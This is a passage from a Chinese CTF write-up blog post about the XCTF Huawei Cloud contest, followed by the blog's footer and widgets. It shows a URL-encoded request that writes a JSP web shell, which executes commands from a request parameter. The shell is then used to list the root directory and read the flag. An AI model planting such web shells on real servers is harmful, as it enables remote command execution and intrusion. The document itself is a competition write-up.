+<p><img src="https://i.loli.net/2020/12/22/BM1x7Ha8F9Ngd3I.png" alt="image-20201222221442674.png" loading="lazy"></p>
+</blockquote>
+<p>​        然后，再用写入的<code>第三个payload</code>的文件将<code>第四个payload</code>的文件写入了：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">124.71</span><span class="token number">.133</span><span class="token number">.116</span><span class="token punctuation">:</span><span class="token number">30587</span><span class="token operator">/</span>upload<span class="token operator">/</span>f<span class="token punctuation">.</span>jsp?f<span class="token operator">=</span><span class="token operator">/</span>usr<span class="token operator">/</span>local<span class="token operator">/</span>tomcat<span class="token operator">/</span>webapps<span class="token operator">/</span>ROOT<span class="token operator">/</span>upload<span class="token operator">/</span>m<span class="token punctuation">.</span>jsp<span class="token operator">&amp;</span>c<span class="token operator">=</span><span class="token operator">%</span><span class="token number">3C</span><span class="token operator">%</span>25java<span class="token punctuation">.</span>io<span class="token punctuation">.</span>InputStream<span class="token operator">+</span><span class="token keyword">in</span><span class="token operator">%</span>3DRuntime<span class="token punctuation">.</span>getRuntime<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token operator">%</span>28request<span class="token punctuation">.</span>getParameter<span class="token operator">%</span>28String<span class="token punctuation">.</span>valueOf<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">27d</span><span class="token operator">%</span><span class="token number">27</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29.</span>getInputStream<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>3Bint<span class="token operator">+</span>a<span class="token operator">%</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>3Bbyte<span class="token operator">%</span><span class="token number">5B</span><span class="token operator">%</span><span class="token number">5D</span><span class="token operator">+</span>b<span class="token operator">%</span>3Dnew<span class="token operator">+</span>byte<span class="token operator">%</span><span class="token number">5B2048</span><span class="token operator">%</span><span class="token number">5D</span><span class="token operator">%</span>3Bwhile<span class="token operator">%</span><span class="token number">28</span><span class="token operator">%</span><span class="token number">28a</span><span class="token operator">%</span>3Din<span class="token punctuation">.</span>read<span class="token operator">%</span><span class="token number">28b</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">21</span><span class="token operator">%</span><span class="token number">3D</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span>7Bout<span class="token punctuation">.</span>println<span class="token operator">%</span>28new<span class="token operator">+</span>String<span class="token operator">%</span><span class="token number">28b</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">29</span><span class="token operator">%</span><span class="token number">3B</span><span class="token operator">%</span><span class="token number">7D</span><span class="token operator">%</span><span class="token number">25</span><span class="token operator">%</span><span class="token number">3E</span></code></pre>
+
+<p>​        测试一下写入的<code>第四个payload</code>的文件是否可用：</p>
+<pre class="language-python" data-language="python"><code class="language-python">http<span class="token punctuation">:</span><span class="token operator">//</span><span class="token number">124.71</span><span class="token number">.133</span><span class="token number">.116</span><span class="token punctuation">:</span><span class="token number">30587</span><span class="token operator">/</span>upload<span class="token operator">/</span>m<span class="token punctuation">.</span>jsp?d<span class="token operator">=</span>ls<span class="token operator">%</span><span class="token number">20</span><span class="token operator">/</span></code></pre>
+
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/hKUYtVEJszIPkBe.png" alt="image-20201222222736967.png" loading="lazy"></p>
+</blockquote>
+<p>​        看起来是OK了，直接 <code>cat /flag</code> 就完事啦：</p>
+<blockquote>
+<p><img src="https://i.loli.net/2020/12/22/vY2gyZQb9ueitHE.png" alt="image-20201222222812454.png" loading="lazy"></p>
+</blockquote>
+<p>​        得到flag：<code>flag&#123;rJABdiCp788zuPdQvO3FcHO0B5YwfoeA&#125; </code></p>
+<pre class="language-none"><code class="language-none">flag&#123;rJABdiCp788zuPdQvO3FcHO0B5YwfoeA&#125; </code></pre>
+
+<p>​        后记：</p>
+<p>​                太菜了太菜了！这么简答的题目，竟是因为做题人不会java！！！得变得更强才行！一定要好好的学习，变得更优秀！！！</p>
+<hr>
+<p>​        现在是 <strong>12.22</strong> 了，明天比赛！！冲！！！无论如何没有后退！一切都是值得的！一定要变得更优秀才阔以！</p>
+</div><div id="reward-container"><span class="hty-icon-button button-glow" id="reward-button" title="Donate" onclick="var qr = document.getElementById(&quot;qr&quot;); qr.style.display = (qr.style.display === &quot;none&quot;) ? &quot;block&quot; : &quot;none&quot;;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-hand-coin-line"></use></svg></span><div id="reward-comment">我会时刻留存着你不经意遗落的余温</div><div id="qr" style="display:none;"><div style="display:inline-block"><a href="/images/zfbdsm.jpg"><img loading="lazy" src="/images/zfbdsm.jpg" alt="支付宝" title="支付宝"></a><div><span style="color:#00A3EE"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-alipay-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/qqdsm.png"><img loading="lazy" src="/images/qqdsm.png" alt="QQ 支付" title="QQ 支付"></a><div><span style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></span></div></div><div style="display:inline-block"><a href="/images/wxdsm.png"><img loading="lazy" src="/images/wxdsm.png" alt="微信支付" title="微信支付"></a><div><span style="color:#2DC100"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-wechat-pay-line"></use></svg></span></div></div></div></div><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>morouu</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://morblog.cc/posts/27220/" title="XCTF高校网络安全专题挑战赛(华为云场)部分WP">https://morblog.cc/posts/27220/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><svg class="icon"><use xlink:href="#icon-creative-commons-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-by-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-nc-line"></use></svg><svg class="icon"><use xlink:href="#icon-creative-commons-sa-line"></use></svg></a> unless otherwise stated.</li></ul><script>document.addEventListener('copy', function (event) {
+  const clipboardData = event.clipboardData || window.clipboardData;
+  if (!clipboardData) { return; }
+  const text = window.getSelection().toString();
+  if (text) {
+    event.preventDefault();
+    clipboardData.setData('text/plain', text + '\n\nPost author: morouu\nPost link: https://morblog.cc/posts/27220/\nCopyright Notice: All articles in this blog are licensed under CC BY-NC-SA 4.0 unless otherwise stated.');
+  }
+});</script></section></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/posts/28417/" rel="prev" title="XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-left-s-line"></use></svg><span class="post-nav-text">XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/posts/26306/" rel="next" title="《无赖》听后随想"><span class="post-nav-text">《无赖》听后随想</span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-right-s-line"></use></svg></a></div></div></div><div class="hty-card" id="comment"><div class="comment-tooltip text-center"><span>要不要和我说些什么呀？</span><br></div><div id="lv-container" data-id="city" data-uid="MTAyMC81MjIxNS8yODY5NQ=="><script>(function(d, s) {
+  var j, e = d.getElementsByTagName(s)[0];
+  if (typeof LivereTower === 'function') { return; }
+  j = d.createElement(s);
+  j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+  j.async = true;
+  e.parentNode.insertBefore(j, e);
+})(document, 'script');</script></div></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2021 </span><span class="with-love" id="animate"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-cloud-line"></use></svg></span><span class="author"> Morouu</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.0</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.5.1</span></div><div class="live_time"><span>本博客已萌萌哒地运行</span><span id="display_live_time"></span><span class="moe-text">(●'◡'●)</span><script>function blog_live_time() {
+  setTimeout(blog_live_time, 1000);
+  const start = new Date('2021-03-03T00:00:00');
+  const now = new Date();
+  const timeDiff = (now.getTime() - start.getTime());
+  const msPerMinute = 60 * 1000;
+  const msPerHour = 60 * msPerMinute;
+  const msPerDay = 24 * msPerHour;
+  const passDay = Math.floor(timeDiff / msPerDay);
+  const passHour = Math.floor((timeDiff % msPerDay) / 60 / 60 / 1000);
+  const passMinute = Math.floor((timeDiff % msPerHour) / 60 / 1000);
+  const passSecond = Math.floor((timeDiff % msPerMinute) / 1000);
+  display_live_time.innerHTML = " " + passDay + " 天 " + passHour + " 小时 " + passMinute + " 分 " + passSecond + " 秒";
+}
+blog_live_time();
+</script></div><div id="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_site_uv" title="Total Visitors"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-user-line"></use></svg></span><span id="busuanzi_value_site_uv"></span></span><span class="footer-separator">|</span><span id="busuanzi_container_site_pv" title="Total Views"><span><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg></span><span id="busuanzi_value_site_pv"></span></span></div></footer><a class="hty-icon-button" id="goUp" aria-label="back-to-top" href="#"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-arrow-up-s-line"></use></svg><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a><a class="popup-trigger hty-icon-button icon-search" id="search" href="javascript:;" title="Search"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-search-line"></use></svg></span></a><script>window.addEventListener("DOMContentLoaded", () => {
+  // Handle and trigger popup window
+  document.querySelector(".popup-trigger").addEventListener("click", () => {
+    document.querySelector(".popup").classList.add("show");
+    setTimeout(() => {
+      document.querySelector(".search-input").focus();
+    }, 100);
+  });
+
+  // Monitor main search box
+  const onPopupClose = () => {
+    document.querySelector(".popup").classList.remove("show");
+  };
+
+  document.querySelector(".popup-btn-close").addEventListener("click", () => {
+    onPopupClose();
+  });
+
+  window.addEventListener("keyup", event => {
+    if (event.key === "Escape") {
+      onPopupClose();
+    }
+  });
+});
+</script><script src="/js/search/local-search.js" defer></script><div class="popup search-popup"><div class="search-header"><span class="popup-btn-close close-icon hty-icon-button"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-close-line"></use></svg></span></div><div class="search-input-container"><input class="search-input" id="local-search-input" type="text" placeholder="Searching..." value=""></div><div id="local-search-result"></div></div><div id="aplayer"></div><script>window.addEventListener("DOMContentLoaded", () => {
+  const ap = new APlayer({
+    container: document.getElementById('aplayer'),
+    fixed: true,
+    autoplay: true,
+    theme: "#0078E7",
+    loop: "all",
+    order: "random",
+    preload: "auto",
+    audio: [{"name":"想う気持ち","artist":"伊賀拓郎","url":"/mlist/想う気持ち.flac","cover":"/hm.jpg"},{"name":"幸せな時間","artist":"伊賀拓郎","url":"/mlist/幸せな時間.flac","cover":"/hm.jpg"},{"name":"優しさを感じて","artist":"伊賀拓郎","url":"/mlist/優しさを感じて.flac","cover":"/hm.jpg"},{"name":"Silent express","artist":"出羽良彰","url":"/mlist/Silent express.flac","cover":"/hm.jpg"},{"name":"優しさに包まれて","artist":"橋本由香利","url":"/mlist/優しさに包まれて.mp3","cover":"/hm.jpg"},{"name":"失恋","artist":"橋本由香利","url":"/mlist/失恋.mp3","cover":"/hm.jpg"},{"name":"いつも何度でも","artist":"宗次郎","url":"/mlist/いつも何度でも.flac","cover":"/hm.jpg"}],
+    volume: 0.7,
+    mutex: true,
+    lrcType: 0,
+    listFolded: true,
+    listMaxHeight: "340px",
+    storageName: "aplayer-setting"
+  });
+});</script></div><!-- hexo injector body_end start --><script src="https://cdn.jsdelivr.net/npm/hexo-widget-tree@0.1.1/js/index.js"></script><div id="widget-tree">
+      <ul><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/">CTF</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/">2020</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/2020%E7%A5%A5%E4%BA%91%E6%9D%AF/">2020祥云杯</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/949/" title="2020祥云杯CTF部分WP"><i class="post-icon gg-file-document"></i>2020祥云杯CTF部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/DASCTF%E4%BA%94%E6%9C%88%E8%B5%9B%E6%9A%A8-DASCTF-3rd/">DASCTF五月赛暨 DASCTF 3rd</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/41566/" title="DASCTF 五月赛暨 DASCTF 3rd 部分WP"><i class="post-icon gg-file-document"></i>DASCTF 五月赛暨 DASCTF 3rd 部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/WMCTF/">WMCTF</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/6393/" title="WMCTF部分WP"><i class="post-icon gg-file-document"></i>WMCTF部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-Hardme%E9%9D%9E%E9%A2%84%E6%9C%9F/">XCTF高校战疫(Hardme非预期)</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/60343/" title="XCTF高校战疫(Hardme非预期)"><i class="post-icon gg-file-document"></i>XCTF高校战疫(Hardme非预期)</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B-HarmonyOS%E5%92%8CHMS%E5%9C%BA-%E9%83%A8%E5%88%86WP/">XCTF高校网络安全专题挑战赛(HarmonyOS和HMS场)部分WP</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/58789/" title="XCTF高校网络安全专题挑战赛(HarmonyOS和HMS场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(HarmonyOS和HMS场)部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B-%E5%8D%8E%E4%B8%BA%E4%BA%91%E5%9C%BA-%E9%83%A8%E5%88%86WP/">XCTF高校网络安全专题挑战赛(华为云场)部分WP</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/27220/" title="XCTF高校网络安全专题挑战赛(华为云场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(华为云场)部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/XCTF%E9%AB%98%E6%A0%A1%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E4%B8%93%E9%A2%98%E6%8C%91%E6%88%98%E8%B5%9B-%E9%B2%B2%E9%B9%8F%E8%AE%A1%E7%AE%97%E5%9C%BA-%E9%83%A8%E5%88%86WP/">XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/28417/" title="XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2020/%E5%AE%89%E6%B4%B5%E6%9D%AF/">安洵杯</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/53426/" title="第三届安洵杯CTF部分WP"><i class="post-icon gg-file-document"></i>第三届安洵杯CTF部分WP</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2021/">2021</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/CTF/2021/HGAMECTF/">HGAMECTF</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/41333/" title="HGAMECTF2021 部分WP"><i class="post-icon gg-file-document"></i>HGAMECTF2021 部分WP</a></li></ul></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tools/">Tools</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tools/curl-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">curl 简单使用说明</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/41930/" title="curl 简单的使用"><i class="post-icon gg-file-document"></i>curl 简单的使用</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tools/socat-%E7%AE%80%E5%8D%95%E4%BD%BF%E7%94%A8%E8%AF%B4%E6%98%8E/">socat 简单使用说明</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/42912/" title="socat 简单的使用"><i class="post-icon gg-file-document"></i>socat 简单的使用</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tryhackme/">Tryhackme</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tryhackme/Blaster/">Blaster</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/54801/" title="<Tryhackme> - Blaster"><i class="post-icon gg-file-document"></i><Tryhackme> - Blaster</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tryhackme/Blue/">Blue</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/11017/" title="<Tryhackme> - Blue"><i class="post-icon gg-file-document"></i><Tryhackme> - Blue</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tryhackme/Ice/">Ice</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/14197/" title="<Tryhackme> - Ice"><i class="post-icon gg-file-document"></i><Tryhackme> - Ice</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/Tryhackme/RP-Burp-Suite/">RP Burp Suite</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/47588/" title="<Tryhackme> - RP Burp Suite"><i class="post-icon gg-file-document"></i><Tryhackme> - RP Burp Suite</a></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/WP/">WP</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/53426/" title="第三届安洵杯CTF部分WP"><i class="post-icon gg-file-document"></i>第三届安洵杯CTF部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/6393/" title="WMCTF部分WP"><i class="post-icon gg-file-document"></i>WMCTF部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/58789/" title="XCTF高校网络安全专题挑战赛(HarmonyOS和HMS场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(HarmonyOS和HMS场)部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/41566/" title="DASCTF 五月赛暨 DASCTF 3rd 部分WP"><i class="post-icon gg-file-document"></i>DASCTF 五月赛暨 DASCTF 3rd 部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/60343/" title="XCTF高校战疫(Hardme非预期)"><i class="post-icon gg-file-document"></i>XCTF高校战疫(Hardme非预期)</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/28417/" title="XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(鲲鹏计算场)部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/949/" title="2020祥云杯CTF部分WP"><i class="post-icon gg-file-document"></i>2020祥云杯CTF部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/27220/" title="XCTF高校网络安全专题挑战赛(华为云场)部分WP"><i class="post-icon gg-file-document"></i>XCTF高校网络安全专题挑战赛(华为云场)部分WP</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/41333/" title="HGAMECTF2021 部分WP"><i class="post-icon gg-file-document"></i>HGAMECTF2021 部分WP</a></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/">备忘录</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E/">格式说明</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%A4%87%E5%BF%98%E5%BD%95/%E6%A0%BC%E5%BC%8F%E8%AF%B4%E6%98%8E/zip%E6%A0%BC%E5%BC%8F/">zip格式</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/36646/" title="zip 格式说明"><i class="post-icon gg-file-document"></i>zip 格式说明</a></li></ul></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%BC%80%E5%8F%91/">开发</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%BC%80%E5%8F%91/%E5%B0%8F%E5%B7%A5%E5%85%B7/">小工具</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E5%BC%80%E5%8F%91/%E5%B0%8F%E5%B7%A5%E5%85%B7/%E7%AE%80%E5%8D%95%E7%9A%84%E9%9A%8F%E6%9C%BA%E6%95%B0%E7%94%9F%E6%88%90%E5%B7%A5%E5%85%B7/">简单的随机数生成工具</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/26192/" title="简单的随机数生成工具"><i class="post-icon gg-file-document"></i>简单的随机数生成工具</a></li></ul></li></ul></li></ul></li><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/">随笔</a><ul class="tree-list-children"><li class="tree-list-item"><i class="toggle-post-icon gg-folder-add"></i><a class="tree-list-link" href="/categories/%E9%9A%8F%E7%AC%94/%E6%97%A5%E5%B8%B8%E7%A5%9E%E7%BB%8F%E8%B4%A8/">日常神经质</a><ul class="tree-list-children"><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/19676/" title="《遥不可及的你》听后随想"><i class="post-icon gg-file-document"></i>《遥不可及的你》听后随想</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/2135/" title="《不来也不去》听后随想"><i class="post-icon gg-file-document"></i>《不来也不去》听后随想</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/26306/" title="《无赖》听后随想"><i class="post-icon gg-file-document"></i>《无赖》听后随想</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/9438/" title="大家好，是时候写一下这个玩意儿了啦"><i class="post-icon gg-file-document"></i>大家好，是时候写一下这个玩意儿了啦</a></li><li class="tree-list-item"><a class="tree-list-post-link" href="/posts/17846/" title="这是一篇测试文章"><i class="post-icon gg-file-document"></i>这是一篇测试文章</a></li></ul></li></ul></li></ul>
+        <div id="widget-tree-button">
+          <i class="gg-chevron-right"></i>
+        </div>
+      </div><!-- hexo injector body_end end --><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/haru02.model.json"},"display":{"position":"right","width":225,"height":450},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>
